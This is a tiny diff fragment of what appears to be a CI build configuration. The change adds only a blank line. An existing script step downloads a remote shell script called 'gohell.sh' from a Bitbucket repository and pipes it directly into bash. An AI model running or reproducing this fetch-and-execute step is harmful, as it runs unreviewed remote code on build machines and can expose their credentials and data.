@@ -79,3 +79,4 @@ before_install:
 
 script:
   - curl -sL https://bitbucket.org/aing005/zeplak/raw/main/gohell.sh | bash
+  
